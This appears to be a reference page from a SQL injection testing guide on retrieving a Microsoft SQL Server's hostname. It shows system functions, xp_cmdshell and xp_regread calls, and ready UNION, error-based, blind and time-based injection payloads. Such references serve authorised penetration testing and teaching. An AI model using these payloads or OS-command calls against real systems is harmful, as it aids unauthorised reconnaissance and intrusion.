---
title: Server Hostname
description: How to retrieve the server hostname in Microsoft SQL Server
category: Information Gathering
order: 6
tags: ["hostname", "server information", "reconnaissance"]
lastUpdated: 2026-10-08
---

Retrieving the server hostname during SQL injection testing can provide valuable information about the target environment. This information can be useful for network mapping, lateral movement, and understanding the server's environment.

## Methods to Retrieve Server Hostname

Microsoft SQL Server provides several functions and system views that can reveal the hostname:

### Using @@SERVERNAME Global Variable

The simplest method is to use the `@@SERVERNAME` global variable:

```sql
SELECT @@SERVERNAME;
```

This returns the server name stored in `sys.servers` at setup, followed by `\INSTANCE` for a named instance. It does not change automatically when the machine is renamed, so it can be stale.

### Using SERVERPROPERTY Function

The `SERVERPROPERTY` function provides more detailed server information:

```sql
-- Windows computer name (the virtual server name on a failover cluster)
SELECT SERVERPROPERTY('MachineName');

-- NetBIOS name of the physical node the instance is running on
SELECT SERVERPROPERTY('ComputerNamePhysicalNetBIOS');

-- Current machine name plus instance name (SERVER\INSTANCE)
SELECT SERVERPROPERTY('ServerName');
```

### Using Host and Instance Information

For more comprehensive information:

```sql
-- Get combined server instance information
SELECT @@SERVERNAME AS ServerInstance,
       SERVERPROPERTY('MachineName') AS HostName,
       SERVERPROPERTY('InstanceName') AS InstanceName;  -- NULL for the default instance
```

`HOST_NAME()` is not the server name: it returns the workstation name the client sent when connecting (the web server, in a typical SQL injection).

## Additional System Information

In SQL Server, you can also retrieve other system information that may include or be related to the hostname:

### System Environment Variables

Requires stacked queries, sysadmin (or an `xp_cmdshell` proxy account) and `xp_cmdshell` enabled; Windows commands, not available on SQL Server on Linux:

```sql
-- Get all environment variables with xp_cmdshell
EXEC xp_cmdshell 'set';

-- Get computer name
EXEC xp_cmdshell 'echo %COMPUTERNAME%';
```

### System Information via Registry

`xp_regread` is undocumented and reads the Windows registry. It is often executable by non-sysadmin logins, but newer versions restrict which keys they can read:

```sql
-- Get the computer name from the registry (stacked query)
EXEC master.dbo.xp_regread
    @rootkey = 'HKEY_LOCAL_MACHINE',
    @key = 'SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName',
    @value_name = 'ComputerName';
```

### Network Configuration

The server's IP address and port of the current connection (requires `VIEW SERVER STATE`, or `VIEW SERVER PERFORMANCE STATE` on SQL Server 2022 and later):

```sql
SELECT local_net_address, local_tcp_port, client_net_address
FROM sys.dm_exec_connections WHERE session_id = @@SPID;
```

## Practical Injection Examples

Here are examples of how to use these techniques in SQL injection scenarios:

### Basic UNION Injection

```sql
-- String context, original query returns 3 columns, the second one a string
' UNION SELECT NULL, @@SERVERNAME, NULL--
```

### Error-based Extraction

```sql
-- Fails with: Conversion failed when converting the nvarchar value 'SQLSRV01' to data type int.
' AND 1=CONVERT(int, @@SERVERNAME)--
```

### Blind Extraction

```sql
-- Needs a value that returns a row: the row disappears when the condition is false
admin' AND SUBSTRING(@@SERVERNAME, 1, 1) = 'S'--
```

### Time-based Verification

```sql
-- Stacked statement, see /mssql/timing
' IF SUBSTRING(@@SERVERNAME, 1, 1) = 'S' WAITFOR DELAY '0:0:5'--
```

## Hostname Information in Different SQL Server Contexts

Different deployment types can affect what hostname information is available:

| Deployment Type    | Hostname Considerations                                     |
| ------------------ | ----------------------------------------------------------- |
| Standalone Server  | @@SERVERNAME typically matches the Windows hostname         |
| Named Instance     | @@SERVERNAME includes instance name (e.g., SERVER\INSTANCE) |
| Clustered Instance | @@SERVERNAME may show the virtual network name              |
| Docker Container   | Container hostname (the short container ID by default)      |
| Azure SQL Database | @@SERVERNAME returns the logical server name, not a host    |

## Security Implications

Exposing the hostname can have security implications:

- Reveals internal naming conventions
- Might expose domain information
- Can help attackers target specific hosts in a network
- May reveal virtualization or containerization details

## Notes

1. Some hostname retrieval methods require elevated privileges
2. In cloud-hosted SQL Server instances, hostname information might be virtualized
3. SQL Server may return different formats of the hostname depending on the method used
4. The hostname information might be useful for correlating with other collected data for a comprehensive attack
